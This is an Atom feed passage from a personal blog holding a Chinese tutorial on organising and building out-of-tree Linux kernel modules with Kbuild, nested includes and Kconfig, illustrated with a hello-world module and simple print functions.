<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>arttnba3&#39;s blog</title>
  
  <subtitle>arttnba3的秘密小屋</subtitle>
  <link href="https://arttnba3.github.io/atom.xml" rel="self"/>
  
  <link href="https://arttnba3.github.io/"/>
  <updated>2025-02-28T02:22:04.355Z</updated>
  <id>https://arttnba3.github.io/</id>
  
  <author>
    <name>arttnba3</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>【DEV.0x01】如何优雅地开发树外内核模块</title>
    <link href="https://arttnba3.github.io/2025/01/12/DEV-0X01-LKM_WITH_KBUILD_DKMS/"/>
    <id>https://arttnba3.github.io/2025/01/12/DEV-0X01-LKM_WITH_KBUILD_DKMS/</id>
    <published>2025-01-12T08:22:33.000Z</published>
    <updated>2025-02-28T02:22:04.355Z</updated>
    
    <content type="html"><![CDATA[<p>我在 5:20 make install—— 13：14 准时 kernel panic</p><span id="more"></span><h1 id="0x00-一切开始之前"><a href="#0x00-一切开始之前" class="headerlink" title="0x00. 一切开始之前"></a>0x00. 一切开始之前</h1><p>虽然说已经做了这么多年的内核开发（？）了，但是笔者开发的内核模块一般都仅局限于极其狭隘的特定用途（例如写点 <a href="https://github.com/arttnba3/Nornir-Rootkit">小 rootkit</a> 之类的），也没咋组织过比较优雅的代码结构，基本上都是一个丑陋的 Makefile 包办一切，需要这个内核模块的时候直接粗糙地手动 <code>insmod</code> ——能用是能用，但确实也就局限于自用了：（</p><p>因此这篇博客主要讲讲如何使用 <a href="https://docs.kernel.org/kbuild/kbuild.html">Kbuild</a> 组织代码并使用 <a href="https://github.com/dell/dkms">DKMS</a> 等工具优雅地开发与打包一个 out-of-tree 的 Linux 内核模块</p><h1 id="0x01-基本的内核模块"><a href="#0x01-基本的内核模块" class="headerlink" title="0x01. 基本的内核模块"></a>0x01. 基本的内核模块</h1><p>我们首先写一个基础的内核模块：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Copyright (c) 2025 arttnba3 &lt;arttnba@gmail.com&gt;</span><br><span class="hljs-comment"> * </span><br><span class="hljs-comment"> * This work is licensed under the terms of the GNU GPL, version 2 or later.</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/kernel.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/module.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/init.h&gt;</span></span><br><br><span class="hljs-type">static</span> __init <span class="hljs-type">int</span> <span class="hljs-title function_">a3kmod_init</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    printk(KERN_INFO <span class="hljs-string">&quot;Hello kernel world!\n&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-type">static</span> __exit <span class="hljs-type">void</span> <span class="hljs-title function_">a3kmod_exit</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    printk(KERN_INFO <span class="hljs-string">&quot;Goodbye kernel world!\n&quot;</span>);<br>&#125;<br><br>module_init(a3kmod_init);<br>module_exit(a3kmod_exit);<br>MODULE_AUTHOR(<span class="hljs-string">&quot;arttnba3&quot;</span>);<br>MODULE_LICENSE(<span class="hljs-string">&quot;GPL v2&quot;</span>);<br><br></code></pre></td></tr></table></figure><p>下面我们开始搭建模块源码文件结构，组织如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">tree .</span><br>.<br>├── Makefile<br>└── src<br>    ├── Kbuild<br>    └── main.c<br><br>2 directories, 3 files<br></code></pre></td></tr></table></figure><h2 id="使用-Kbuild-组织源码文件"><a href="#使用-Kbuild-组织源码文件" class="headerlink" title="使用 Kbuild 组织源码文件"></a>使用 Kbuild 组织源码文件</h2><h3 id="基础的-Kbuild-Makefile-示例"><a href="#基础的-Kbuild-Makefile-示例" class="headerlink" title="基础的 Kbuild &amp; Makefile 示例"></a>基础的 Kbuild &amp; Makefile 示例</h3><p><a href="https://docs.kernel.org/kbuild/kbuild.html">Kbuild</a> 是 Linux kernel 构建系统的一部分，简而言之，当我们在源码目录下编写了 <code>Kbuild</code> 文件之后，在编译时 Linux kernel 的编译基础设施便会根据 <code>Kbuild</code> 来自动地编译好我们的内核模块，若没有 <code>Kbuild</code> 则会选择寻找 <code>Makefile</code> </p><p>相比起把所有待编译文件与配置都写到一个 Makefile 里（例如 <a href="https://github.com/NVIDIA/open-gpu-kernel-modules">nvidia-open</a> 便是这么做的，看起来并不美观），拆分到多级 Makefile 当中通常是更易于维护的做法，而使用 Kbuild 组织编译结构则是更加优雅的一种方式</p><p>下面是一个最基础的 Kbuild 文件的示例，语法上有点类似于 Makefile：</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-comment"># module name</span><br>MODULE_NAME ?= a3kmod<br>obj-m += <span class="hljs-variable">$(MODULE_NAME)</span>.o<br><br><span class="hljs-comment"># compiler flags</span><br>ccflags-y += -I<span class="hljs-variable">$(src)</span>/<span class="hljs-keyword">include</span><br><br><span class="hljs-comment"># entry point</span><br><span class="hljs-variable">$(MODULE_NAME)</span>-y += main.o<br></code></pre></td></tr></table></figure><p>各符号说明如下：</p><ul><li><p><code>MODULE_NAME</code> ：一个简单的自定义变量，我们用来定义我们的模块名</p></li><li><p><code>obj-m</code> ：这个符号用来指定要被编译的内核模块列表，<code>+=</code> 意味着添加上我们的内核模块，而 <code>$(MODULE_NAME).o</code> 则是我们的内核模块编译的后期产物，这通常由单个或多个目标文件合并而成，最后会被链接为 <code>$(MODULE_NAME).ko</code> 文件，也就是我们所熟悉的 LKM ELF</p><blockquote><p>如果要将模块编译进内核 ELF 文件（vmlinux）中，则应当使用 <code>obj-y</code></p></blockquote></li><li><p><code>ccflags-y</code> ：<code>ccflags</code> 意味着编译选项，<code>-y</code> 意味着开启的编译选项，这里我们添加了 <code>-I</code> 选项以引入我们自己的头文件目录，更多编译选项可以参见 <a href="https://gcc.gnu.org/onlinedocs/gcc/Invoking-GCC.html">GCC 的文档</a></p></li><li><p><code>$(MODULE_NAME)-y</code> ：<code>$(MODULE_NAME).o</code>所需要的目标文件，<code>-y</code> 意味着编译过程需要该文件，这里我们加入了一个 <code>main.o</code> ，意味着我们的源码目录下应当有一个 <code>main.c</code></p></li></ul><p>注意到这里有很多的 <code>-字符</code> ，这个设定其实是为了让我们灵活地配置编译选项，例如我们可以将 <code>-y</code> 替换为 <code>-$(某个变量名)</code> ，从而在该变量为 <code>y</code> 的时候才包含该选项，例如以下示例意味着在选项配置中包含 <code>CONFIG_X86_64=y</code> 时才会在模块中编译入 <code>x86_64_tools.c</code> ：</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-variable">$(MODULE_NAME)</span>-<span class="hljs-variable">$(CONFIG_X86_64)</span> += x86_64_tools.o<br></code></pre></td></tr></table></figure><p>这同样适用于对内核模块的配置，对于树内模块，我们可以在 <code>.config</code> 文件当中配置某个指定变量的值为 <code>=y</code> 或 <code>=m</code> ，从而决定将该模块编译进内核或是作为独立的 ELF 存在，例如以下示例意味着这个模块是否编译进内核由变量 <code>CONFIG_MY_A3KMODULE</code> 的值决定：</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs makefile">A3KMODULE_NAME ?= a3kmod<br>obj-<span class="hljs-variable">$(CONFIG_MY_A3KMODULE)</span> += <span class="hljs-variable">$(A3KMODULE_NAME)</span>.o<br></code></pre></td></tr></table></figure><p>相应地，由于我们已经在 Kbuild 当中指示了模块的构建行为，我们只需要在源码根目录的 Makefile 当中写入通用性内容，这里我们的 Makefile 写入如下：</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-comment"># SPDX-License-Identifier: GPL-2.0</span><br><span class="hljs-comment"># Copyright (c) 2025 arttnba3 &lt;arttnba@gmail.com&gt;</span><br><br>A3KMOD_ROOT_DIR=<span class="hljs-variable">$(<span class="hljs-built_in">shell</span> pwd)</span><br>A3KMOD_SRC_DIR=<span class="hljs-variable">$(A3KMOD_ROOT_DIR)</span>/src<br>LINUX_KERNEL_SRC=/lib/modules/<span class="hljs-variable">$(<span class="hljs-built_in">shell</span> uname -r)</span>/build<br><br><span class="hljs-section">all:</span><br>@<span class="hljs-variable">$(MAKE)</span> -C <span class="hljs-variable">$(LINUX_KERNEL_SRC)</span> M=<span class="hljs-variable">$(A3KMOD_SRC_DIR)</span> modules<br><br><span class="hljs-section">clean:</span><br>@<span class="hljs-variable">$(MAKE)</span> -C <span class="hljs-variable">$(LINUX_KERNEL_SRC)</span> M=<span class="hljs-variable">$(A3KMOD_SRC_DIR)</span> clean<br><br><span class="hljs-meta"><span class="hljs-keyword">.PHONY</span>: clean</span><br><br></code></pre></td></tr></table></figure><p>简要说明如下（想更详细了解可自行深入学习 Makefile 语法）：</p><ul><li><code>A3KMOD_ROOT_DIR</code> 、 <code>A3KMOD_SRC_DIR</code> ：这些变量指定了源码目录为当前目录下的 <code>src</code> 文件夹，<code>$(shell pwd)</code> 意味着其值为 <code>pwd</code> 命令的结果</li><li><code>LINUX_KERNEL_SRC</code> ：这个变量指定了 Linux 内核源码目录，对于绝大多数 Linux 发行版而言，在安装了相应的软件包（例如 <code>linux-headers</code> ）后，在 <code>/lib/modules/$(shell uname -r)/build</code> 目录下都会存放着当前所用内核的源码以及编译系统文件，其中 <code>$(shell uname -r)</code> 意味着其值为 <code>uname -r</code> 的结果</li><li><code>all:</code> ：名为 <code>all</code> 的标签，在执行 <code>make all</code> 时会执行该标签下的命令，由于这是 Makefile 中的第一个命令，所以直接执行 <code>make</code> 默认会运行该命令<ul><li><code>@$(MAKE)</code> ：<code>@$(MAKE)</code> 指定了使用当前环境中的 <code>MAKE</code> 命令（这意味着我们在运行 <code>make</code> 命令时可以可以通过指定 <code>MAKE=</code> 更改其路径，默认值是 <code>make</code> ）</li><li><code> -C $(LINUX_KERNEL_SRC)</code> ：make 指令进入到内核源码目录进行</li><li><code>modules</code> ：执行内核源码 Makefile 中的 <code>modules</code> 项，意味着进行内核模块编译行为</li><li><code>M=$(A3KMOD_SRC_DIR)</code>：指定参数 <code>M</code> 的值，对 <code>modules</code> 项而言代表要编译的内核模块的源码路径</li></ul></li><li><code>clean:</code> ：和 <code>all</code> 标签传递的基本一致，不同在于最后执行的行为是 <code>clean</code> ，意味着清理编译产物</li><li><code>.PHONY</code>：“伪目标”，即相比同名文件而言优先找 Makefile 中的标签定义，这里将 <code>clean</code> 标签声明为伪目标</li></ul><h3 id="多级目录的多级-Kbuild-组织"><a href="#多级目录的多级-Kbuild-组织" class="headerlink" title="多级目录的多级 Kbuild 组织"></a>多级目录的多级 Kbuild 组织</h3><p>鉴于绝大部分的内核模块s都是各种不同类型设备的驱动，他们通常都只有单级结构，但不乏有一些场景会需要结构设计较为复杂的内核模块，如果把所有源码文件都堆到同一级子目录下未免不太雅观，因此根据代码架构设计拆分到不同的多级目录中是较为常见的做法，而文件一多起来再将所有编译配置选项都放到同一个 Kbuild 或是 Makefile 当中对维护者而言自然是一种地狱般的体验（例如应该不太会有人想去细看<a href="https://github.com/NVIDIA/open-gpu-kernel-modules/blob/main/src/nvidia/srcs.mk">这个文件</a>）</p><p>因此拆分成多级 Kbuild 文件在软件工程中通常是比较恰当的做法，我们以如下代码目录作为示例讲解：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">tree .</span><br>.<br>├── Makefile<br>└── src<br>    ├── Kbuild<br>    ├── main.c<br>    └── sub<br>        ├── Kbuild<br>        ├── sub.c<br>        └── sub_sub<br>            ├── Kbuild<br>            └── sub_sub.c<br><br>4 directories, 7 files<br></code></pre></td></tr></table></figure><p>首先是 <code>src/sub/sub_sub</code> 目录，我们使用 <code>Kbuild</code> 文件配置这个子目录下需要编译的文件，这里简单编写如下，需要注意的是这里应当和源码根目录下的 Kbuild 一样以源码根目录文件作为相对根目录（后面我们会解释为什么）：</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-comment"># SPDX-License-Identifier: GPL-2.0</span><br><br><span class="hljs-variable">$(MODULE_NAME)</span>-y += sub/sub_sub/sub_sub.o<br></code></pre></td></tr></table></figure><p>在 <code>src/sub/sub_sub/sub_sub.c</code> 当中我们简单定义一个打印函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Copyright (c) 2025 arttnba3 &lt;arttnba@gmail.com&gt;</span><br><span class="hljs-comment"> * </span><br><span class="hljs-comment"> * This work is licensed under the terms of the GNU GPL, version 2 or later.</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/kernel.h&gt;</span></span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">foo_sub_sub</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    printk(KERN_INFO <span class="hljs-string">&quot;[a3kmod:] Here&#x27;s the sub_sub!\n&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>然后是 <code>src/sub</code> 目录，我们使用 <code>Kbuild</code> 文件配置这个子目录下需要编译的文件，同样是以源码根目录文件作为相对根目录来包含入咱们的 <code>sub.c</code> 源码文件，但在此之外我们额外地使用 <code>include</code> 语句<strong>将 sub_sub 目录的 Kbuild 文件包含到该文件当中</strong>：</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-comment"># SPDX-License-Identifier: GPL-2.0</span><br><br><span class="hljs-variable">$(MODULE_NAME)</span>-y += sub/sub.o<br><br><span class="hljs-keyword">include</span> <span class="hljs-variable">$(src)</span>/sub/sub_sub/Kbuild<br></code></pre></td></tr></table></figure><p>在 <code>src/sub/sub.c</code> 当中我们同样简单定义一个打印函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Copyright (c) 2025 arttnba3 &lt;arttnba@gmail.com&gt;</span><br><span class="hljs-comment"> * </span><br><span class="hljs-comment"> * This work is licensed under the terms of the GNU GPL, version 2 or later.</span><br><span class="hljs-comment">**/</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/kernel.h&gt;</span></span><br><br><span class="hljs-keyword">extern</span> <span class="hljs-type">void</span> <span class="hljs-title function_">foo_sub_sub</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span>;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">foo_sub</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    printk(KERN_INFO <span class="hljs-string">&quot;[a3kmod:] Here&#x27;s the sub!\n&quot;</span>);<br>    foo_sub_sub();<br>&#125;<br> <br></code></pre></td></tr></table></figure><p>现在大家应该明白为什么以源码根目录文件作为相对根目录，因为我们最终要在源码根目录下的 <code>Kbuild</code> 文件当中 <code>include</code> 下一级子目录的 <code>Kbuild</code> 文件，<strong>通过多级包含的方式完成多级 Kbuild 的配置</strong> ，根目录下的 Kbuild 便<strong>仅需要包含次一级子目录的 Kbuild 文件</strong>，而无需再去管理更细的细节：</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-comment"># module name</span><br>MODULE_NAME ?= a3kmod<br>obj-m += <span class="hljs-variable">$(MODULE_NAME)</span>.o<br><br><span class="hljs-comment"># compiler flags</span><br>ccflags-y += -I<span class="hljs-variable">$(src)</span>/<span class="hljs-keyword">include</span><br><br><span class="hljs-comment"># entry point</span><br><span class="hljs-variable">$(MODULE_NAME)</span>-y += main.o<br><br><span class="hljs-comment"># sub directory</span><br><span class="hljs-keyword">include</span> <span class="hljs-variable">$(src)</span>/sub/Kbuild<br><br></code></pre></td></tr></table></figure><h2 id="使用-Kconfig-配置动态编译选项"><a href="#使用-Kconfig-配置动态编译选项" class="headerlink" title="使用 Kconfig 配置动态编译选项"></a>使用 Kconfig 配置动态编译选项</h2><p>现在我们来看 <a href="https://docs.kernel.org/kbuild/kconfig-language.html">Kconfig</a> ——内核的编译选项配置系统，在我们编译内核时通常需要先 <code>make menuconfig</code> 创建配置文件 <code>.config</code> ，其中便包含了配置选项，这些选项会被 Kconfig 系统解析给编译器，通过宏定义的方式作用于源代码，例如下面这个配置决定了是否启用 procfs 文件系统：</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">CONFIG_PROC_FS</span>=y<br></code></pre></td></tr></table></figure><p>在内核或是驱动源码中便可以根据是否定义了 <code>CONFIG_PROC_FS</code> 宏来决定是否将 procfs 相关的代码编译进来，以 <code>arch/arm/kernel/dma.c</code> 为例：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_PROC_FS</span><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">proc_dma_show</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> seq_file *m, <span class="hljs-type">void</span> *v)</span><br>&#123;<br><span class="hljs-type">int</span> i;<br><br><span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span> ; i &lt; MAX_DMA_CHANNELS ; i++) &#123;<br><span class="hljs-type">dma_t</span> *dma = dma_channel(i);<br><span class="hljs-keyword">if</span> (dma &amp;&amp; dma-&gt;lock)<br>seq_printf(m, <span class="hljs-string">&quot;%2d: %s\n&quot;</span>, i, dma-&gt;device_id);<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> __init <span class="hljs-title function_">proc_dma_init</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>proc_create_single(<span class="hljs-string">&quot;dma&quot;</span>, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>, proc_dma_show);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br>__initcall(proc_dma_init);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br></code></pre></td></tr></table></figure><p>Kconfig 配置文件则通过 Kconfig 源文件进行生成，这类文件的语法定义参见 <a href="https://docs.kernel.org/kbuild/kconfig-language.html">Kconfig Language</a> ，下面是一个来自 <a href="https://github.com/arttnba3/Nornir-Rootkit">Nornir-Rootkit</a> 项目的简单的例子，其定义了一个编译选项 <code>CONFIG_NORNIR_PROCFS_UAPI</code> ，默认值为 <code>=y</code> ：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs kconfig">config NORNIR_PROCFS_UAPI<br>    bool &quot;Enable user interface under /proc&quot;<br>    default y<br>    help <br>        Create a node `/proc/nornir` as a user interface<br></code></pre></td></tr></table></figure><p>在实际工程中的 Kconfig 文件通常更加复杂，包括多级的选项菜单定义，这通常是为了实现一个比较友好的用户菜单，这里我们依旧以 <a href="https://github.com/arttnba3/Nornir-Rootkit">Nornir-Rootkit</a> 项目为例，其基于 <a href="https://github.com/espressif/kconfig-frontends">kconfig-frontends</a> 项目（从内核 Kconfig 系统中拆分出来的独立项目，不过已年久失修）的图形化 Kconfig 的配置界面如下：</p><p><img src="https://s2.loli.net/2025/02/25/tGJEH4reK71mych.png"></p><blockquote><p>注：虽然 fork 出来的 <a href="https://github.com/espressif/kconfig-frontends">kconfig-frontends</a> 项目已经年久失修，但我们依然能用一些其他的开源 Kconfig 支持项目（或是自己再从内核里拆分一下）来为我们的代码使用 Kconfig 进行配置</p></blockquote><p>当 Kconfig 系统完成 Kconfig 配置文件的解读与设定之后，通常会生成一份正式的配置文件，其中给出了各个配置的值，对于 Linux kernel 而言这通常是源码目录下的 <code>.config</code> 文件，以 IRQ 子系统为例：</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-comment">#</span><br><span class="hljs-comment"># IRQ subsystem</span><br><span class="hljs-comment">#</span><br>CONFIG_GENERIC_IRQ_PROBE=y<br>CONFIG_GENERIC_IRQ_SHOW=y<br>CONFIG_GENERIC_IRQ_EFFECTIVE_AFF_MASK=y<br>CONFIG_GENERIC_PENDING_IRQ=y<br>CONFIG_GENERIC_IRQ_MIGRATION=y<br></code></pre></td></tr></table></figure><p>下面我们改进一下上面的的代码结构，添加一个我们自己的 Kconfig 文件：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">tree .</span><br>.<br>├── Makefile<br>└── src<br>    ├── Kbuild<br>    ├── Kconfig<br>    ├── main.c<br>    └── sub<br>        ├── Kbuild<br>        ├── sub.c<br>        └── sub_sub<br>            ├── Kbuild<br>            └── sub_sub.c<br><br>4 directories, 8 files<br></code></pre></td></tr></table></figure><p>在这个 Kconfig 当中，我们配置一个二级菜单，以及两个编译配置选项：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs kconfig">mainmenu &quot;A3KMOD Test Configuration&quot;<br><br>menu &quot;First-level sub directory&quot;<br><br>    config ENABLE_SUB<br>        bool &quot;Enable first-level sub directory&quot;<br>        default y<br><br>    menu &quot;Second-level sub directory&quot;<br>        depends on ENABLE_SUB<br><br>        config ENABLE_SUB_SUB<br>        bool &quot;Enable second-level sub directory&quot;<br>        default y<br><br>    endmenu<br><br>endmenu<br></code></pre></td></tr></table></figure><p>下面我们使用 <a href="https://pypi.org/project/kconfiglib/#history">kconfiglig</a> 来演示配置文件的生成，对于上面的配置文件我们有这样一个简单的二级菜单入口，其中第二级菜单依赖于第一级菜单的开启：</p><p><img src="https://s2.loli.net/2025/02/25/JtBSgapyAjmvFQb.png"></p><p>我们控制第一级菜单开启，而第二级菜单不开启，生成的 <code>.config</code> 文件如下：</p><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs haxe"><br><span class="hljs-meta">#</span><br><span class="hljs-meta"># First-level sub directory</span><br><span class="hljs-meta">#</span><br>CONFIG_ENABLE_SUB=y<br><br><span class="hljs-meta">#</span><br><span class="hljs-meta"># Second-level sub directory</span><br><span class="hljs-meta">#</span><br><span class="hljs-meta"># CONFIG_ENABLE_SUB_SUB is not set</span><br><span class="hljs-meta"># <span class="hljs-keyword">end</span> of Second-level sub directory</span><br><span class="hljs-meta"># <span class="hljs-keyword">end</span> of First-level sub directory</span><br><br></code></pre></td></tr></table></figure><p>和前面类似，我们通过文件包含的形式将生成的 <code>.config</code> 配置文件纳入到我们的编译体系当中，我们将  <code>src/Kbuild</code>  修改如下：</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-comment"># module name</span><br>MODULE_NAME ?= a3kmod<br>obj-m += <span class="hljs-variable">$(MODULE_NAME)</span>.o<br><br><span class="hljs-comment"># compiler flags</span><br>ccflags-y += -I<span class="hljs-variable">$(src)</span>/<span class="hljs-keyword">include</span><br><br><span class="hljs-comment"># custom config options</span><br><span class="hljs-keyword">include</span> <span class="hljs-variable">$(src)</span>/../.config<br><br><span class="hljs-comment"># entry point</span><br><span class="hljs-variable">$(MODULE_NAME)</span>-y += main.o<br><br><span class="hljs-comment"># sub directory</span><br><span class="hljs-keyword">include</span> <span class="hljs-variable">$(src)</span>/sub/Kbuild<br></code></pre></td></tr></table></figure><p>在 <code>src/sub/Kbuild</code> 当中，我们通过 <code>$(模块名)-(选项名)</code> 的方式 <strong>控制源文件的编译</strong> ，通过 <code>ccflags-$(选项名) += -D选项名</code> 的方式来<strong>在编译过程中动态定义该宏</strong> ：</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-comment"># SPDX-License-Identifier: GPL-2.0</span><br><br><span class="hljs-variable">$(MODULE_NAME)</span>-<span 